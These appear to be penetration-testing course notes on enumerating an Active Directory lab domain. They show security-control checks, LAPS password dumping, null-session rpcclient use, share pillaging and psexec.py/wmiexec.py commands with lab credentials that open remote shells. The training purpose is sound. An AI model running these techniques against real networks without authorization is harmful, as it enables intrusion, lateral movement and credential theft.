# Enumerating Security Controls

---

After gaining a foothold, we could use this access to get a feeling for the defensive state of the hosts, enumerate the domain further now that our visibility is not as restricted, and, if necessary, work at "living off the land" by using tools that exist natively on the hosts. It is important to understand the security controls in place in an organization as the products in use can affect the tools we use for our AD enumeration, as well as exploitation and post-exploitation. Understanding the protections we may be up against will help inform our decisions regarding tool usage and assist us in planning our course of action by either avoiding or modifying certain tools. Some organizations have more stringent protections than others, and some do not apply security controls equally throughout. There may be policies applied to certain machines that can make our enumeration more difficult that are not applied on other machines.

Note: This section is intended to showcase possible security controls in place within a domain, but does not have an interactive component. Enumerating and bypassing security controls are outside the scope of this module, but we wanted to give an overview of the possible technologies we may encounter during an assessment.

---

## Windows Defender

Windows Defender (or [Microsoft Defender](https://en.wikipedia.org/wiki/Microsoft_Defender) after the Windows 10 May 2020 Update) has greatly improved over the years and, by default, will block tools such as `PowerView`. There are ways to bypass these protections. These ways will be covered in other modules. We can use the built-in PowerShell cmdlet [Get-MpComputerStatus](https://docs.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=win10-ps) to get the current Defender status. Here, we can see that the `RealTimeProtectionEnabled` parameter is set to `True`, which means Defender is enabled on the system.

#### Checking the Status of Defender with Get-MpComputerStatus
![](../../ZMEDIA/Pasted%20image%2020260706233230.png)

---

## AppLocker

An application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system. The goal is to protect the environment from harmful malware and unapproved software that does not align with the specific business needs of an organization. [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft's application whitelisting solution and gives system administrators control over which applications and files users can run. It provides granular control over executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers. It is common for organizations to block cmd.exe and PowerShell.exe and write access to certain directories, but this can all be bypassed. Organizations also often focus on blocking the `PowerShell.exe` executable, but forget about the other [PowerShell executable locations](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`. We can see that this is the case in the `AppLocker` rules shown below. All Domain Users are disallowed from running the 64-bit PowerShell executable located at:

`%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe`

So, we can merely call it from other locations. Sometimes, we run into more stringent `AppLocker` policies that require more creativity to bypass. These ways will be covered in other modules.

#### Using Get-AppLockerPolicy cmdlet
![](../../ZMEDIA/Pasted%20image%2020260706233300.png)

---

## PowerShell Constrained Language Mode

PowerShell [Constrained Language Mode](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) locks down many of the features needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more. We can quickly enumerate whether we are in Full Language Mode or Constrained Language Mode.

#### Enumerating Language Mode

```powershell
PS C:\htb> $ExecutionContext.SessionState.LanguageMode ConstrainedLanguage
```

---

## LAPS

The Microsoft [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) is used to randomize and rotate local administrator passwords on Windows hosts and prevent lateral movement. We can enumerate what domain users can read the LAPS password set for machines with LAPS installed and what machines do not have LAPS installed. The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) greatly facilitates this with several functions. One is parsing `ExtendedRights` for all computers with LAPS enabled. This will show groups specifically delegated to read LAPS passwords, which are often users in protected groups. An account that has joined a computer to a domain receives `All Extended Rights` over that host, and this right gives the account the ability to read passwords. Enumeration may show a user account that can read the LAPS password on a host. This can help us target specific AD users who can read LAPS passwords.

#### Using Find-LAPSDelegatedGroups
![](../../ZMEDIA/Pasted%20image%2020260706233327.png)

The `Find-AdmPwdExtendedRights` checks the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights." Users with "All Extended Rights" can read LAPS passwords and may be less protected than users in delegated groups, so this is worth checking for.

#### Using Find-AdmPwdExtendedRights

```powershell
PS C:\htb> Find-AdmPwdExtendedRights 
ComputerName                Identity                    Reason 
------------                  --------                    ------ 
EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\Domain Admins Delegated EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\LAPS Admins   Delegated SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\Domain Admins Delegated SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\LAPS Admins   Delegated WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\Domain Admins Delegated WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\LAPS Admins   Delegated
```

We can use the `Get-LAPSComputers` function to search for computers that have LAPS enabled when passwords expire, and even the randomized passwords in cleartext if our user has access.

#### Using Get-LAPSComputers

```powershell
PS C:\htb> Get-LAPSComputers 
ComputerName                Password       Expiration 
------------                --------       ---------- 
DC01.INLANEFREIGHT.LOCAL    6DZ[+A/[]19d$F 08/26/2020 23:29:45 EXCHG01.INLANEFREIGHT.LOCAL oj+2A+[hHMMtj, 09/26/2020 00:51:30 SQL01.INLANEFREIGHT.LOCAL   9G#f;p41dcAe,s 09/26/2020 00:30:09 WS01.INLANEFREIGHT.LOCAL    TCaG-F)3No;l8C 09/26/2020 00:46:04
```

---

## Conclusion

As we have seen in this section, several other helpful AD enumeration techniques are available to us to determine what protections are in place. It is worth familiarizing yourself with all of these tools and techniques, and adding them to your arsenal of options. Now, let's continue our enumeration of the INLANEFREIGHT.LOCAL domain from a credentialed standpoint.

# Credentialed Enumeration - from Linux

---

Now that we have acquired a foothold in the domain, it is time to dig deeper using our low privilege domain user credentials. Since we have a general idea about the domain's userbase and machines, it's time to enumerate the domain in depth. We are interested in information about domain user and computer attributes, group membership, Group Policy Objects, permissions, ACLs, trusts, and more. We have various options available, but the most important thing to remember is that most of these tools will not work without valid domain user credentials at any permission level. So at a minimum, we will have to have acquired a user's cleartext password, NTLM password hash, or SYSTEM access on a domain-joined host.

To follow along, spawn the target at the bottom of this section and SSH to the Linux attack host as the `htb-student` user. For enumeration of the INLANEFREIGHT.LOCAL domain using the tools installed on the ATTACK01 Parrot Linux host, we will use the following credentials: User=`forend` and password=`Klmcargo2`. Once our access is established, it's time to get to work. We'll start with `CrackMapExec`.

---

## CrackMapExec

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (CME, now NetExec) is a powerful toolset to help with assessing AD environments. It utilizes packages from the Impacket and PowerSploit toolkits to perform its functions. For detailed explanations on using the tool and accompanying modules, see the [wiki](https://www.netexec.wiki/). Don't be afraid to use the `-h` flag to review the available options and syntax.

#### CME Help Menu
![](../../ZMEDIA/Pasted%20image%2020260706233607.png)

We can see that we can use the tool with MSSQL, SMB, SSH, and WinRM credentials. Let's look at our options for CME with the SMB protocol:

#### CME Options (SMB)
![](../../ZMEDIA/Pasted%20image%2020260706233635.png)

CME offers a help menu for each protocol (i.e., `crackmapexec winrm -h`, etc.). Be sure to review the entire help menu and all possible options. For now, the flags we are interested in are:

- -u Username `The user whose credentials we will use to authenticate`
- -p Password `User's password`
- Target (IP or FQDN) `Target host to enumerate` (in our case, the Domain Controller)
- --users `Specifies to enumerate Domain Users`
- --groups `Specifies to enumerate domain groups`
- --loggedon-users `Attempts to enumerate what users are logged on to a target, if any`

We'll start by using the SMB protocol to enumerate users and groups. We will target the Domain Controller (whose address we uncovered earlier) because it holds all data in the domain database that we are interested in. Make sure you preface all commands with `sudo`.

#### CME - Domain User Enumeration

We start by pointing CME at the Domain Controller and using the credentials for the `forend` user to retrieve a list of all domain users. Notice when it provides us the user information, it includes data points such as the [badPwdCount](https://docs.microsoft.com/en-us/windows/win32/adschema/a-badpwdcount) attribute. This is helpful when performing actions like targeted password spraying. We could build a target user list filtering out any users with their `badPwdCount` attribute above 0 to be extra careful not to lock any accounts out.

![](../../ZMEDIA/Pasted%20image%2020260706233659.png)

We can also obtain a complete listing of domain groups. We should save all of our output to files to easily access it again later for reporting or use with other tools.

#### CME - Domain Group Enumeration
![](../../ZMEDIA/Pasted%20image%2020260706233724.png)

The above snippet lists the groups within the domain and the number of users in each. The output also shows the built-in groups on the Domain Controller, such as `Backup Operators`. We can begin to note down groups of interest. Take note of key groups like `Administrators`, `Domain Admins`, `Executives`, any groups that may contain privileged IT admins, etc. These groups will likely contain users with elevated privileges worth targeting during our assessment.

#### CME - Logged On Users

We can also use CME to target other hosts. Let's check out what appears to be a file server to see what users are logged in currently.
![](../../ZMEDIA/Pasted%20image%2020260706233741.png)

We see that many users are logged into this server which is very interesting. We can also see that our user `forend` is a local admin because `(Pwn3d!)` appears after the tool successfully authenticates to the target host. A host like this may be used as a jump host or similar by administrative users. We can see that the user `svc_qualys` is logged in, who we earlier identified as a domain admin. It could be an easy win if we can steal this user's credentials from memory or impersonate them.

As we will see later, `BloodHound` (and other tools such as `PowerView`) can be used to hunt for user sessions. BloodHound is particularly powerful as we can use it to view Domain User sessions graphically and quickly in many ways. Regardless, tools such as CME are great for more targeted enumeration and user hunting.

#### CME Share Searching

We can use the `--shares` flag to enumerate available shares on the remote host and the level of access our user account has to each share (READ or WRITE access). Let's run this against the INLANEFREIGHT.LOCAL Domain Controller.

#### Share Enumeration - Domain Controller
![](../../ZMEDIA/Pasted%20image%2020260706233759.png)

We see several shares available to us with `READ` access. The `Department Shares`, `User Shares`, and `ZZZ_archive` shares would be worth digging into further as they may contain sensitive data such as passwords or PII. Next, we can dig into the shares and spider each directory looking for files. The module `spider_plus` will dig through each readable share on the host and list all readable files. Let's give it a try.

#### Spider_plus
![](../../ZMEDIA/Pasted%20image%2020260706233818.png)
In the above command, we ran the spider against the `Department Shares`. When completed, CME writes the results to a JSON file located at `/tmp/cme_spider_plus/<ip of host>`. Below we can see a portion of the JSON output. We could dig around for interesting files such as `web.config` files or scripts that may contain passwords. If we wanted to dig further, we could pull those files to see what all resides within, perhaps finding some hardcoded credentials or other sensitive information.
![](../../ZMEDIA/Pasted%20image%2020260706233834.png)
CME is powerful, and this is only a tiny look at its capabilities; it is worth experimenting with it more against the lab targets. We will utilize CME in various ways as we progress through the remainder of this module. Let's move on and take a look at [SMBMap](https://github.com/ShawnDEvans/smbmap) now.

---

## SMBMap

SMBMap is great for enumerating SMB shares from a Linux attack host. It can be used to gather a listing of shares, permissions, and share contents if accessible. Once access is obtained, it can be used to download and upload files and execute remote commands.

Like CME, we can use SMBMap and a set of domain user credentials to check for accessible shares on remote systems. As with other tools, we can type the command `smbmap` `-h` to view the tool usage menu. Aside from listing shares, we can use SMBMap to recursively list directories, list the contents of a directory, search file contents, and more. This can be especially useful when pillaging shares for useful information.

#### SMBMap To Check Access
![](../../ZMEDIA/Pasted%20image%2020260706233849.png)

The above will tell us what our user can access and their permission levels. Like our results from CME, we see that the user `forend` has no access to the DC via the `ADMIN$` or `C$` shares (this is expected for a standard user account), but does have read access over `IPC$`, `NETLOGON`, and `SYSVOL` which is the default in any domain. The other non-standard shares, such as `Department Shares` and the user and archive shares, are most interesting. Let's do a recursive listing of the directories in the `Department Shares` share. We can see, as expected, subdirectories for each department in the company.

#### Recursive List Of All Directories
![](../../ZMEDIA/Pasted%20image%2020260706233901.png)

As the recursive listing dives deeper, it will show you the output of all subdirectories within the higher-level directories. The use of `--dir-only` provided only the output of all directories and did not list all files. Try this against other shares on the Domain Controller and see what you can find.

Now that we've covered shares, let's look at `RPCClient`.

---

## rpcclient

[rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) is a handy tool created for use with the Samba protocol and to provide extra functionality via MS-RPC. It can enumerate, add, change, and even remove objects from AD. It is highly versatile; we just have to find the correct command to issue for what we want to accomplish. The man page for rpcclient is very helpful for this; just type `man rpcclient` into your attack host's shell and review the options available. Let's cover a few rpcclient functions that can be helpful during a penetration test.

Due to SMB NULL sessions (covered in-depth in the password spraying sections) on some of our hosts, we can perform authenticated or unauthenticated enumeration using rpcclient in the INLANEFREIGHT.LOCAL domain. An example of using rpcclient from an unauthenticated standpoint (if this configuration exists in our target domain) would be:

```bash
rpcclient -U "" -N 172.16.5.5
```

The above will provide us with a bound connection, and we should be greeted with a new prompt to start unleashing the power of rpcclient.

#### SMB NULL Session with rpcclient

![GIF showcasing the usage of rpcclient with SMB NULL session.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/rpcclient.png)

From here, we can begin to enumerate any number of different things. Let's start with domain users.

#### rpcclient Enumeration

While looking at users in rpcclient, you may notice a field called `rid:` beside each user. A [Relative Identifier (RID)](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) is a unique identifier (represented in hexadecimal format) utilized by Windows to track and identify objects. To explain how this fits in, let's look at the examples below:

- The [SID](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) for the INLANEFREIGHT.LOCAL domain is: `S-1-5-21-3842939050-3880317879-2865463114`.
- When an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.
- So the domain user `htb-student` with a RID:0x457 Hex 0x457 would = decimal `1111`, will have a full user SID of: `S-1-5-21-3842939050-3880317879-2865463114-1111`.
- This is unique to the `htb-student` object in the INLANEFREIGHT.LOCAL domain and you will never see this paired value tied to another object in this domain or any other.

However, there are accounts that you will notice that have the same RID regardless of what host you are on. Accounts like the built-in Administrator for a domain will have a RID administrator rid:0x1f4, which, when converted to a decimal value, equals `500`. The built-in Administrator account will always have the RID value `Hex 0x1f4`, or 500. This will always be the case. Since this value is unique to an object, we can use it to enumerate further information about it from the domain. Let's give it a try again with rpcclient. We will dig a bit targeting the `htb-student` user.

#### RPCClient User Enumeration By RID
![](../../ZMEDIA/Pasted%20image%2020260706233930.png)

When we searched for information using the `queryuser` command against the RID `0x457`, RPC returned the user information for `htb-student` as expected. This wasn't hard since we already knew the RID for `htb-student`. If we wished to enumerate all users to gather the RIDs for more than just one, we would use the `enumdomusers` command.

#### Enumdomusers
![](../../ZMEDIA/Pasted%20image%2020260706233943.png)

Using it in this manner will print out all domain users by name and RID. Our enumeration can go into great detail utilizing rpcclient. We could even start performing actions such as editing users and groups or adding our own into the domain, but this is out of scope for this module. For now, we just want to perform domain enumeration to validate our findings. Take some time to play with the other rpcclient functions and see the results they produce. For more information on topics such as SIDs, RIDs, and other core components of AD, it would be worthwhile to check out the [Introduction to Active Directory](https://academy.hackthebox.com/course/preview/introduction-to-active-directory) module. Now, it's time to plunge into Impacket in all its glory.

---

## Impacket Toolkit

Impacket is a versatile toolkit that provides us with many different ways to enumerate, interact, and exploit Windows protocols and find the information we need using Python. The tool is actively maintained and has many contributors, especially when new attack techniques arise. We could perform many other actions with Impacket, but we will only highlight a few in this section; [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) and [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py). Earlier in the poisoning section, we grabbed a hash for the user `wley` with `Responder` and cracked it to obtain the password `transporter@4`. We will see in the next section that this user is a local admin on the `ACADEMY-EA-FILE` host. We will utilize the credentials for the next few actions.

#### Psexec.py

One of the most useful tools in the Impacket suite is `psexec.py`. Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. The tool creates a remote service by uploading a randomly-named executable to the `ADMIN$` share on the target host. It then registers the service via `RPC` and the `Windows Service Control Manager`. Once established, communication happens over a named pipe, providing an interactive remote shell as `SYSTEM` on the victim host.

#### Using psexec.py

To connect to a host with psexec.py, we need credentials for a user with local administrator privileges.

```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```

![GIF showcasing the usage of psexec.py, authenticating as the user wley.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/psexec-action.png)

Once we execute the psexec module, it drops us into the `system32` directory on the target host. We ran the `whoami` command to verify, and it confirmed that we landed on the host as `SYSTEM`. From here, we can perform almost any task on this host; anything from further enumeration to persistence and lateral movement. Let's give another Impacket module a try: `wmiexec.py`.

#### wmiexec.py

Wmiexec.py utilizes a semi-interactive shell where commands are executed through [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page). It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands). This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems. We will use the same account as with psexec.py to access the host.

#### Using wmiexec.py

```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

![GIF showcasing the usage of wmiexec.py, authenticating as the user wley.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/wmiexec-action.png)

Note that this shell environment is not fully interactive, so each command issued will execute a new cmd.exe from WMI and execute your command. The downside of this is that if a vigilant defender checks event logs and looks at event ID [4688: A new process has been created](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688), they will see a new process created to spawn cmd.exe and issue a command. This isn't always malicious activity since many organizations utilize WMI to administer computers, but it can be a tip-off in an investigation. In the image above, it's also apparent that the process is running under the context of user `wley` on the host, not as SYSTEM. Impacket is an immensely valuable tool that has plenty of use cases. We will see many other tools in the Impacket toolkit throughout the remainder of this module. As a pentester working with Windows hosts, this tool should always be in our arsenal. Let's move on to the next tool, `Windapsearch`.

---

## Windapsearch

[Windapsearch](https://github.com/ropnop/windapsearch) is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries. It is present in our attack host's /opt/windapsearch/ directory.

#### Windapsearch Help

![](../../ZMEDIA/Pasted%20image%2020260706234029.png)
We have several options with Windapsearch to perform standard enumeration (dumping users, computers, and groups) and more detailed enumeration. The `--da` (enumerate domain admins group members ) option and the `-PU` ( find privileged users) options. The `-PU` option is interesting because it will perform a recursive search for users with nested group membership.

#### Windapsearch - Domain Admins
![](../../ZMEDIA/Pasted%20image%2020260706234043.png)

From the results in the shell above, we can see that it enumerated 28 users from the Domain Admins group. Take note of a few users we have already seen before and may even have a hash or cleartext password like `wley`, `svc_qualys`, and `lab_adm`.

To identify more potential users, we can run the tool with the `-PU` flag and check for users with elevated privileges that may have gone unnoticed. This is a great check for reporting since it will most likely inform the customer of users with excess privileges from nested group membership.

#### Windapsearch - Privileged Users
![](../../ZMEDIA/Pasted%20image%2020260706234056.png)

You'll notice that it performed mutations against common elevated group names in different languages. This output gives an example of the dangers of nested group membership, and this will become more evident when we work with BloodHound graphics to visualize this.

---

## Bloodhound.py

Once we have domain credentials, we can run the [BloodHound.py](https://github.com/fox-it/BloodHound.py) BloodHound ingestor from our Linux attack host. BloodHound is one of, if not the most impactful tools ever released for auditing Active Directory security, and it is hugely beneficial for us as penetration testers. We can take large amounts of data that would be time-consuming to sift through and create graphical representations or "attack paths" of where access with a particular user may lead. We will often find nuanced flaws in an AD environment that would have been missed without the ability to run queries with the BloodHound GUI tool and visualize issues. The tool uses [graph theory](https://en.wikipedia.org/wiki/Graph_theory) to visually represent relationships and uncover attack paths that would have been difficult, or even impossible to detect with other tools. The tool consists of two parts: the [SharpHound collector](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) written in C# for use on Windows systems, or for this section, the BloodHound.py collector (also referred to as an `ingestor`) and the [BloodHound](https://github.com/BloodHoundAD/BloodHound/releases) GUI tool which allows us to upload collected data in the form of JSON files. Once uploaded, we can run various pre-built queries or write custom queries using [Cypher language](https://specterops.io/blog/2017/09/18/bloodhound-intro-to-cypher/). The tool collects data from AD such as users, groups, computers, group membership, GPOs, ACLs, domain trusts, local admin access, user sessions, computer and user properties, RDP access, WinRM access, etc.

It was initially only released with a PowerShell collector, so it had to be run from a Windows host. Eventually, a Python port (which requires Impacket, `ldap3`, and `dnspython`) was released by a community member. This helped immensely during penetration tests when we have valid domain credentials, but do not have rights to access a domain-joined Windows host or do not have a Windows attack host to run the SharpHound collector from. This also helps us not have to run the collector from a domain host, which could potentially be blocked or set off alerts (though even running it from our attack host will most likely set off alarms in well-protected environments).

Running `bloodhound-python -h` from our Linux attack host will show us the options available.

#### BloodHound.py Options
![](../../ZMEDIA/Pasted%20image%2020260706234112.png)

As we can see the tool accepts various collection methods with the `-c` or `--collectionmethod` flag. We can retrieve specific data such as user sessions, users and groups, object properties, ACLS, or select `all` to gather as much data as possible. Let's run it this way.

#### Executing BloodHound.py
![](../../ZMEDIA/Pasted%20image%2020260706234125.png)

The command above executed Bloodhound.py with the user `forend`. We specified our nameserver as the Domain Controller with the `-ns` flag and the domain, INLANEFREIGHt.LOCAL with the `-d` flag. The `-c all` flag told the tool to run all checks. Once the script finishes, we will see the output files in the current working directory in the format of <date_object.json>.

#### Viewing the Results

```shellsession
haphestus@htb[/htb]$ ls 20220307163102_computers.json  20220307163102_domains.json  20220307163102_groups.json  20220307163102_users.json
```

#### Upload the Zip File into the BloodHound GUI

We could then type `sudo neo4j start` to start the [neo4j](https://neo4j.com/) service, firing up the database we'll load the data into and also run Cypher queries against.

Next, we can type `bloodhound` from our Linux attack host when logged in using `freerdp` to start the BloodHound GUI application and upload the data. The credentials are pre-populated on the Linux attack host, but if for some reason a credential prompt is shown, use:

- `user == neo4j` / `pass == HTB_@cademy_stdnt!`.

Once all of the above is done, we should have the BloodHound GUI tool loaded with a blank slate. Now we need to upload the data. We can either upload each JSON file one by one or zip them first with a command such as `zip -r ilfreight_bh.zip *.json` and upload the Zip file. We do this by clicking the `Upload Data` button on the right side of the window (green arrow). When the file browser window pops up to select a file, choose the zip file (or each JSON file) (red arrow) and hit `Open`.

#### Uploading the Zip File

![BloodHound interface showing database info and file selection for 'BloodHound.zip' in Downloads folder.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/bh-injest.png)

Now that the data is loaded, we can use the Analysis tab to run queries against the database. These queries can be custom and specific to what you decide using [custom Cypher queries](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/). There are many great cheat sheets to help us here. We will discuss custom Cypher queries more in a later section. As seen below, we can use the built-in `Path Finding` queries on the `Analysis tab` on the `Left` side of the window.

#### Searching for Relationships

![BloodHound interface displaying pre-built analytics queries and a graph of Active Directory relationships.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/bh-analysis.png)

The query chosen to produce the map above was `Find Shortest Paths To Domain Admins`. It will give us any logical paths it finds through users/groups/hosts/ACLs/GPOs, etc., relationships that will likely allow us to escalate to Domain Administrator privileges or equivalent. This will be extremely helpful when planning our next steps for lateral movement through the network. Take some time to experiment with the various features: look at the `Database Info` tab after uploading data, search for a node such as `Domain Users` and, scroll through all of the options under the `Node Info` tab, check out the pre-built queries under the `Analysis` tab, many which are powerful and can quickly find various ways to domain takeover. Finally, experiment with some custom Cypher queries by selecting some interesting ones from the Cypher cheatsheet linked above, pasting them into the `Raw Query` box at the bottom, and hitting enter. You can also play with the `Settings` menu by clicking the gear icon on the right side of the screen and adjusting how nodes and edges are displayed, enable query debug mode, and enable dark mode. Throughout the remainder of this module, we will use BloodHound in various ways, but for a dedicated study on the BloodHound tool, check out the [Active Directory BloodHound](https://academy.hackthebox.com/course/preview/active-directory-bloodhound) module.

In the next section, we will cover running the SharpHound collector from a domain-joined Windows host and work through some examples of working with the data in the BloodHound GUI.

---

We experimented with several new tools for domain enumeration from a Linux host. The following section will cover several more tools we can use from a domain-joined Windows host. As a quick note, if you haven't checked out the [WADComs project](https://wadcoms.github.io/) yet, you definitely should. It is an interactive cheat sheet for many of the tools we will cover (and more) in this module. It's hugely helpful when you can't remember exact command syntax or are trying out a tool for the first time. Worth bookmarking and even [contributing](https://wadcoms.github.io/contribute/) to!

Now, let's switch gears and start digging into the INLANEFREIGHT.LOCAL domain from our Windows attack host.

# Credentialed Enumeration - from Windows

---

In the previous section, we explored some tools we can use from our Linux attack host for enumeration with valid domain credentials. In this section, we will experiment with a few tools for enumerating from a Windows attack host, such as SharpHound/BloodHound, PowerView/SharpView, Grouper2, Snaffler, and some built-in tools useful for AD enumeration. Some of the data we gather in this phase may provide more information for reporting, not just directly lead to attack paths. Depending on the assessment type, our client may be interested in all possible findings, so even issues like the ability to run BloodHound freely or certain user account attributes may be worth including in our report as either medium-risk findings or a separate appendix section. Not every issue we uncover has to be geared towards forwarding our attacks. Some of the results may be informational in nature but useful to the customer to help improve their security posture.

At this point, we are interested in other misconfigurations and permission issues that could lead to lateral and vertical movement. We are also interested in getting a bigger picture of how the domain is set up, i.e., do any trusts exist with other domains both inside and outside the current forest? We're also interested in pillaging file shares that our user has access to, as these often contain sensitive data such as credentials that can be used to further our access.

---

## TTPs

The first tool we will explore is the [ActiveDirectory PowerShell module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps). When landing on a Windows host in the domain, especially one an admin uses, there is a chance you will find valuable tools and scripts on the host.

---

## ActiveDirectory PowerShell Module

The ActiveDirectory PowerShell module is a group of PowerShell cmdlets for administering an Active Directory environment from the command line. It consists of 147 different cmdlets at the time of writing. We can't cover them all here, but we will look at a few that are particularly useful for enumerating AD environments. Feel free to explore other cmdlets included in the module in the lab built for this section, and see what interesting combinations and output you can create.

Before we can utilize the module, we have to make sure it is imported first. The [Get-Module](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/get-module?view=powershell-7.2) cmdlet, which is part of the [Microsoft.PowerShell.Core module](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/?view=powershell-7.2), will list all available modules, their version, and potential commands for use. This is a great way to see if anything like Git or custom administrator scripts are installed. If the module is not loaded, run `Import-Module ActiveDirectory` to load it for use.

#### Discover Modules

```powershell
PS C:\htb> Get-Module 
ModuleType Version    Name                                ExportedCommands 
---------- -------    ----                                ---------------- Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...} 
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...
```

We'll see that the ActiveDirectory module is not yet imported. Let's go ahead and import it.

#### Load ActiveDirectory Module
![](../../ZMEDIA/Pasted%20image%2020260706234314.png)

Now that our modules are loaded, let's begin. First up, we'll enumerate some basic information about the domain with the [Get-ADDomain](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addomain?view=windowsserver2022-ps) cmdlet.

### Get Domain Info
![](../../ZMEDIA/Pasted%20image%2020260706234342.png)

This will print out helpful information like the domain SID, domain functional level, any child domains, and more. Next, we'll use the [Get-ADUser](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-aduser?view=windowsserver2022-ps) cmdlet. We will be filtering for accounts with the `ServicePrincipalName` property populated. This will get us a listing of accounts that may be susceptible to a Kerberoasting attack, which we will cover in-depth after the next section.

#### Get-ADUser
![](../../ZMEDIA/Pasted%20image%2020260706234358.png)
Another interesting check we can run utilizing the ActiveDirectory module, would be to verify domain trust relationships using the [Get-ADTrust](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adtrust?view=windowsserver2022-ps) cmdlet

#### Checking For Trust Relationships
![](../../ZMEDIA/Pasted%20image%2020260706234419.png)

This cmdlet will print out any trust relationships the domain has. We can determine if they are trusts within our forest or with domains in other forests, the type of trust, the direction of the trust, and the name of the domain the relationship is with. This will be useful later on when looking to take advantage of child-to-parent trust relationships and attacking across forest trusts. Next, we can gather AD group information using the [Get-ADGroup](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps) cmdlet.

#### Group Enumeration
![](../../ZMEDIA/Pasted%20image%2020260706234451.png)

We can take the results and feed interesting names back into the cmdlet to get more detailed information about a particular group like so:

#### Detailed Group Info
![](../../ZMEDIA/Pasted%20image%2020260706234506.png)

Now that we know more about the group, let's get a member listing using the [Get-ADGroupMember](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroupmember?view=windowsserver2022-ps) cmdlet.

### Group Membership
![](../../ZMEDIA/Pasted%20image%2020260706234518.png)

We can see that one account, `backupagent`, belongs to this group. It is worth noting this down because if we can take over this service account through some attack, we could use its membership in the Backup Operators group to take over the domain. We can perform this process for the other groups to fully understand the domain membership setup. Try repeating the process with a few different groups. You will see that this process can be tedious, and we will be left with an enormous amount of data to sift through. We must know how to do this with built-in tools such as the ActiveDirectory PowerShell module, but we will see later in this section just how much tools like BloodHound can speed up this process and make our results far more accurate and organized.

Utilizing the ActiveDirectory module on a host can be a stealthier way of performing actions than dropping a tool onto a host or loading it into memory and attempting to use it. This way, our actions could potentially blend in more. Next, we will walk through the PowerView tool, which has many features to simplify enumeration and dig deeper into the domain.

---

## PowerView

[PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) is a tool written in PowerShell to help us gain situational awareness within an AD environment. Much like BloodHound, it provides a way to identify where users are logged in on a network, enumerate domain information such as users, computers, groups, ACLS, trusts, hunt for file shares and passwords, perform Kerberoasting, and more. It is a highly versatile tool that can provide us with great insight into the security posture of our client's domain. It requires more manual work to determine misconfigurations and relationships within the domain than BloodHound but, when used right, can help us to identify subtle misconfigurations.

Let's examine some of PowerView's capabilities and see what data it returns. The table below describes some of the most useful functions PowerView offers.

|**Command**|**Description**|
|---|---|
|`Export-PowerViewCSV`|Append results to a CSV file|
|`ConvertTo-SID`|Convert a User or group name to its SID value|
|`Get-DomainSPNTicket`|Requests the Kerberos ticket for a specified Service Principal Name (SPN) account|
|**Domain/LDAP Functions:**||
|`Get-Domain`|Will return the AD object for the current (or specified) domain|
|`Get-DomainController`|Return a list of the Domain Controllers for the specified domain|
|`Get-DomainUser`|Will return all users or specific user objects in AD|
|`Get-DomainComputer`|Will return all computers or specific computer objects in AD|
|`Get-DomainGroup`|Will return all groups or specific group objects in AD|
|`Get-DomainOU`|Search for all or specific OU objects in AD|
|`Find-InterestingDomainAcl`|Finds object ACLs in the domain with modification rights set to non-built in objects|
|`Get-DomainGroupMember`|Will return the members of a specific domain group|
|`Get-DomainFileServer`|Returns a list of servers likely functioning as file servers|
